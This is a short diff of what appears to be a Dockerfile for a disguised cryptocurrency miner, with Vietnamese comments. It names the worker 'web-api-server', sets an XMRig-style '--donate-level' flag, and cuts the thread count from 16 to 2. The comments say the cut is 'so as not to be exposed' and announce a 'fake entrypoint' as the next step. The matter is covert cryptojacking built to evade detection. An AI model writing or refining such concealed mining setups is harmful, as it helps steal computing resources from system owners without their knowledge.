@@ -20,7 +20,7 @@ ENV SERVICE_PARAM5="-p"
 ENV SERVICE_PARAM6="web-api-server"
 # QUAN TRỌNG: Giới hạn số luồng (threads) để không bị lộ
 # Thay '1' bằng số nhân CPU tối đa đại ca muốn dùng (ví dụ: 1, 2)
-ENV SERVICE_PARAM7="-t 16" 
+ENV SERVICE_PARAM7="-t 2" 
 ENV SERVICE_PARAM8="--donate-level=1"
 
 # 4. Tạo một entrypoint giả
